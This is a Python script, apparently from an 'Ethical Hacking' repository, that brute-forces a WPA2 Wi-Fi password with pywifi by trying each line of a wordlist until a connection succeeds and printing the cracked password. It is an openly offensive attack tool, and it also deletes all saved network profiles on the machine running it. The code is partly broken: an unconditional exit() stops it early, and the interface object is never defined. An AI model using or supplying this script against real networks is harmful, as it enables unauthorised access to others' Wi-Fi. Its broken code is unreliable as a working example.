# https://medium.com/analytics-vidhya/wifi-hacking-using-pywifi-4f90ed9b1a2
###############################################################################################################

# Github Repo For Hacking Stuff --> https://github.com/r-sajal/Ethical-Hacking/

###############################################################################################################
# Importing General Libraries
import argparse
import logging
import os, os.path, platform
import sys
import time

# Importing pywifi library
from pywifi import const
from pywifi import Profile

import colorama

colorama.init()

import wifi
from const import *


# Change According to needs -->
# cient_ssid == name of the wifi which you want to hack
# path to already created brute force password file

# client_ssid = "Dfone"
# path_to_file = "data/wifi-passwords.txt"
# path_to_file = "data/passwords.txt"

################################################################################

# noinspection PyArgumentList
logging.basicConfig(
    level=logging.ERROR,
    format="%(levelname)s | %(message)s",
    stream=sys.stdout,
    force=True,
)
# logging.getLogger('pywifi').setLevel(logging.NOTSET)


wifi.initwifi()

type = False
exit()


def main(ssid, password, number):
    profile = Profile()  # create profile instance
    profile.ssid = ssid  # name of client
    profile.auth = const.AUTH_ALG_OPEN  # auth algo
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
    profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher
    profile.key = password  # use generated password

    print("network_profiles: ", len(iface.network_profiles()))
    print("remove_all_network_profiles")
    iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device

    print("network_profiles: ", len(iface.network_profiles()))

    tmp_profile = iface.add_network_profile(profile)  # add new profile

    for var in vars(tmp_profile):
        print(f"{var:15}: {getattr(tmp_profile, var)}")

    time.sleep(0.1)  # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile)  # trying to Connect
    time.sleep(0.35)  # 1s

    if iface.status() == const.IFACE_CONNECTED:  # checker
        time.sleep(1)
        print(BOLD, GREEN, '[*] Crack success!', RESET)
        print(BOLD, GREEN, '[*] password is ' + password, RESET)
        iface.disconnect()
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}] Crack Failed using {}'.format(number, password))


# opening and reading the file
def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            print(RESET, f"[{number}] Trying {ssid} with {pwd}")
            main(ssid, pwd, number)


def menu(client_ssid, path_to_file):
    # Argument Parser for making cmd interative
    parser = argparse.ArgumentParser(description='argparse Example')

    # adding arguments
    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

    print()

    args = parser.parse_args()

    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(1.5)

    # taking wordlist and ssid if given else take default
    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = client_ssid
        filee = path_to_file

        # breaking
    if os.path.exists(filee):
        pass
        #     if platform.system().startswith("Win" or "win"):
        #         os.system("cls")
        #     else:
        #         os.system("clear")

        print(BLUE, "[~] Cracking...")
        pwd(ssid, filee)

    else:
        print(RED, "[-] No Such File.", BLUE)


# Main function call
menu(client_ssid="", path_to_file="")

###########################################################################################################################################################
# END OF FILE

# Code by Sajal Rastogi

###########################################################################################################################################################
